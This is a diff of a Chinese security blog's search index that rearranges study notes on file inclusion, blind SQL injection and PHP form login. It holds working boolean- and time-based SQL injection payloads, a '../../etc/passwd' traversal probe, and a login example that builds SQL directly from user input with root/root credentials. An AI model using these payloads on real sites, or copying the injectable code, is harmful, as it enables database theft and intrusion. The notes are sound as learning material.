-<h1 id="易混淆的重点"><a href="#易混淆的重点" class="headerlink" title="易混淆的重点:"></a>易混淆的重点:</h1><p>文件包含是开发必备的功能,本身不是漏洞,但是任意文件包含就是漏洞;<br>同理,代码执行不是漏洞,任意代码执行才是漏洞</p>
-<h1 id="文件包含的本质："><a href="#文件包含的本质：" class="headerlink" title="文件包含的本质："></a>文件包含的本质：</h1><p>去除代码的冗余性<br>比如:a.php里面写好了数据库连接的函数,b.php中需要数据库的操作时,直接引用a.php就行</p>
-<h1 id="四个PHP的引用函数"><a href="#四个PHP的引用函数" class="headerlink" title="四个PHP的引用函数"></a>四个PHP的引用函数</h1><h2 id="include-出现几次就包含几次"><a href="#include-出现几次就包含几次" class="headerlink" title="include[出现几次就包含几次]"></a>include[出现几次就包含几次]</h2><p>使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p>
-<h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>在php文件被执行之前，php解析器会让被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最好后按新的php文件执行程序代码。</p>
-<h2 id="include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once"><a href="#include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once" class="headerlink" title="include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]"></a>include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]</h2><p>在导入文件前先检测该文件是否在该页面的其他部分被引用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p>
-<h2 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h2><p>是require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同时使用require_once语句在同一页面中引用了两个相同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p>
-<h2 id="（包含不存在文件的时候-include可以继续执行，require不可以）"><a href="#（包含不存在文件的时候-include可以继续执行，require不可以）" class="headerlink" title="（包含不存在文件的时候,include可以继续执行，require不可以）"></a>（包含不存在文件的时候,include可以继续执行，require不可以）</h2><h1 id="文件包含不区分文件后缀且不仅局限于包含根目录"><a href="#文件包含不区分文件后缀且不仅局限于包含根目录" class="headerlink" title="文件包含不区分文件后缀且不仅局限于包含根目录"></a>文件包含不区分文件后缀且不仅局限于包含根目录</h1><p>比如1.txt内是php代码,2.php包含1.txt时,页面会运行1.txt内的PHP语句</p>
-<p>同时,被包含的文件可以不存在于网站根目录,因为是通过函数和路径去寻找并包含的; 然而解析漏洞只能将木马上传到网站的目录下才可以getshell.</p>
-<h1 id="如何寻找文件包含漏洞"><a href="#如何寻找文件包含漏洞" class="headerlink" title="如何寻找文件包含漏洞"></a>如何寻找文件包含漏洞</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h2 id="2-当传参里出现XX-XX-比如index-php-XX-php"><a href="#2-当传参里出现XX-XX-比如index-php-XX-php" class="headerlink" title="2.当传参里出现XX.XX,比如index.php,XX.php"></a>2.当传参里出现XX.XX,比如index.php,XX.php</h2><p>(1)文件包含漏洞<br>(2)任意文件读取漏洞<br>(3)任意文件下载漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.XX.com/download/downfile.asp?filename=123.pdf </span><br><span class="line">可以尝试操作系统的敏感路径,比如../../../../etc/passwd或者window的各种敏感目录</span><br></pre></td></tr></table></figure>
-<h1 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h1><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
-<p>2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p>
-<p>3、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</p>
-<p>4、严格检查include类的文件包含函数中的参数是否外界可控。</p>
+    <title>盲注</title>
+    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
+<p>没有回显的注入都可以使用盲注的做法:</p>
+<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
+<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
+<p>注意:盲注很繁琐,适合于工具</p>
+<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
+<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
+<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
+<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
+<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
+<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
+<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
+<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
+<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>web渗透</category>
       </categories>
       <tags>
-        <tag>文件包含漏洞</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1333,38 +1365,6 @@
         <tag>工具</tag>
         <tag>Burp</tag>
         <tag>SqlMap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>盲注</title>
-    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
-<p>没有回显的注入都可以使用盲注的做法:</p>
-<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
-<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
-<p>注意:盲注很繁琐,适合于工具</p>
-<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
-<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
-<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
-<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
-<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
-<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
-<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
-<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
-<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
-<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1435,38 +1435,6 @@
       </tags>
   </entry>
   <entry>
-    <title>表单验证基础</title>
-    <url>/2023/08/21/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h1 id="表单验证基础"><a href="#表单验证基础" class="headerlink" title="表单验证基础"></a>表单验证基础</h1><h2 id="表单组成"><a href="#表单组成" class="headerlink" title="表单组成"></a>表单组成</h2><h3 id="表单标签："><a href="#表单标签：" class="headerlink" title="表单标签："></a>表单标签：</h3><p>告诉别人我这里是一个表单[数据该传到那里、该用什么方式]     </p>
-<form action="1.html" method="get">
-
-
-        <form>
-            action 数据传到那里
-            method 改用什么方式串(GET / POST)
-        </form>
-
-
-<p>​<br>​        eg:   <form action="1.html" method="get"></p>
-<h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>传参速度更快，但是会在网址(URL)中显示 问号之后 长度限制</p>
-<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>没有长度限制、数据不会在URL显示</p>
-<h3 id="表单域："><a href="#表单域：" class="headerlink" title="表单域："></a>表单域：</h3><p>形形色色的框     </p>
-<h3 id="表单按钮："><a href="#表单按钮：" class="headerlink" title="表单按钮："></a>表单按钮：</h3><p>告诉别人我填完了</p>
-<h2 id="表单验证包含-PHP-数据库-前端"><a href="#表单验证包含-PHP-数据库-前端" class="headerlink" title="表单验证包含:PHP + 数据库 + 前端"></a>表单验证包含:PHP + 数据库 + 前端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;Submit&#x27; value=&quot;登录&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//$_GET 获取GET传参</span><br><span class="line">//$_POST 获取POST传参</span><br><span class="line">//$_REQUEST 获取GET和POST传参  【他是一个数组，通过选中键值的方式选中】</span><br><span class="line"></span><br><span class="line">$username =  $_REQUEST[&#x27;username&#x27;]; //获取登陆用户名</span><br><span class="line">$password = $_REQUEST[&#x27;password&#x27;];   //获取登陆密码</span><br><span class="line">//去数据库验证用户输入的账号密码是否正确</span><br><span class="line">$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;20230209&#x27;);//我要和数据库进行链接  mysqli_connect(地址,账户，密码，库名）</span><br><span class="line">$sql = &quot;select *from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">//$sql = &#x27;select*from admin where username=&quot;&#x27;.$username.&#x27;&quot;and password =&quot;&#x27;.$password.&#x27;&quot;&#x27;;</span><br><span class="line">$a = mysqli_query($conn,$sql); //得到的结果是个对象。未来会说  数组</span><br><span class="line">$result = mysqli_fetch_array($a);  // 能用中文写代码的语言只有一个 易语言 </span><br><span class="line">if($username == $result[&quot;username&quot;] and $username != &#x27;&#x27;)&#123;</span><br><span class="line">	echo &quot;登录成功&quot;;</span><br><span class="line">&#125;else&#123;echo &quot;登录失败，账号密码错误&quot;;&#125;</span><br><span class="line">//执行数据库语句</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><p>(1)PHP文件一定要放在网站根目录(一般来说在phpstudy里的WWW)，而且后缀名正常的情况下必须是PHP </p>
-<p>(2)可以混写，可以写PHP也可以写HTML  </p>
-<p>(3)&lt;?php PHP内容   ?&gt;<br>    <meta charset='UTF-8'><br>    HTML代码，指定了编码格式</p>
-<h3 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h3><p>​            库：多个表在一起就是库<br>​            表：xls表格<br>​            字段：列 表头<br>​            数据（行）：最终的内容。密码是123456</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>html</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>计算机基础</title>
     <url>/2023/08/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h1><h2 id="1-服务器系统"><a href="#1-服务器系统" class="headerlink" title="1.服务器系统"></a>1.服务器系统</h2><h3 id="1-服务器"><a href="#1-服务器" class="headerlink" title="(1)服务器"></a>(1)服务器</h3><p>是一台24小时不关机的电脑 [用来搭载服务]</p>
@@ -1499,6 +1467,38 @@
       </categories>
       <tags>
         <tag>操作系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>表单验证基础</title>
+    <url>/2023/08/21/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="表单验证基础"><a href="#表单验证基础" class="headerlink" title="表单验证基础"></a>表单验证基础</h1><h2 id="表单组成"><a href="#表单组成" class="headerlink" title="表单组成"></a>表单组成</h2><h3 id="表单标签："><a href="#表单标签：" class="headerlink" title="表单标签："></a>表单标签：</h3><p>告诉别人我这里是一个表单[数据该传到那里、该用什么方式]     </p>
+<form action="1.html" method="get">
+
+
+        <form>
+            action 数据传到那里
+            method 改用什么方式串(GET / POST)
+        </form>
+
+
+<p>​<br>​        eg:   <form action="1.html" method="get"></p>
+<h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>传参速度更快，但是会在网址(URL)中显示 问号之后 长度限制</p>
+<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>没有长度限制、数据不会在URL显示</p>
+<h3 id="表单域："><a href="#表单域：" class="headerlink" title="表单域："></a>表单域：</h3><p>形形色色的框     </p>
+<h3 id="表单按钮："><a href="#表单按钮：" class="headerlink" title="表单按钮："></a>表单按钮：</h3><p>告诉别人我填完了</p>
+<h2 id="表单验证包含-PHP-数据库-前端"><a href="#表单验证包含-PHP-数据库-前端" class="headerlink" title="表单验证包含:PHP + 数据库 + 前端"></a>表单验证包含:PHP + 数据库 + 前端</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;username&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;password&#x27; name=&#x27;password&#x27;/&gt;</span><br><span class="line">&lt;input type=&#x27;Submit&#x27; value=&quot;登录&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//$_GET 获取GET传参</span><br><span class="line">//$_POST 获取POST传参</span><br><span class="line">//$_REQUEST 获取GET和POST传参  【他是一个数组，通过选中键值的方式选中】</span><br><span class="line"></span><br><span class="line">$username =  $_REQUEST[&#x27;username&#x27;]; //获取登陆用户名</span><br><span class="line">$password = $_REQUEST[&#x27;password&#x27;];   //获取登陆密码</span><br><span class="line">//去数据库验证用户输入的账号密码是否正确</span><br><span class="line">$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;20230209&#x27;);//我要和数据库进行链接  mysqli_connect(地址,账户，密码，库名）</span><br><span class="line">$sql = &quot;select *from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">//$sql = &#x27;select*from admin where username=&quot;&#x27;.$username.&#x27;&quot;and password =&quot;&#x27;.$password.&#x27;&quot;&#x27;;</span><br><span class="line">$a = mysqli_query($conn,$sql); //得到的结果是个对象。未来会说  数组</span><br><span class="line">$result = mysqli_fetch_array($a);  // 能用中文写代码的语言只有一个 易语言 </span><br><span class="line">if($username == $result[&quot;username&quot;] and $username != &#x27;&#x27;)&#123;</span><br><span class="line">	echo &quot;登录成功&quot;;</span><br><span class="line">&#125;else&#123;echo &quot;登录失败，账号密码错误&quot;;&#125;</span><br><span class="line">//执行数据库语句</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h3><p>(1)PHP文件一定要放在网站根目录(一般来说在phpstudy里的WWW)，而且后缀名正常的情况下必须是PHP </p>
+<p>(2)可以混写，可以写PHP也可以写HTML  </p>
+<p>(3)&lt;?php PHP内容   ?&gt;<br>    <meta charset='UTF-8'><br>    HTML代码，指定了编码格式</p>
+<h3 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2.数据库"></a>2.数据库</h3><p>​            库：多个表在一起就是库<br>​            表：xls表格<br>​            字段：列 表头<br>​            数据（行）：最终的内容。密码是123456</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>html</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
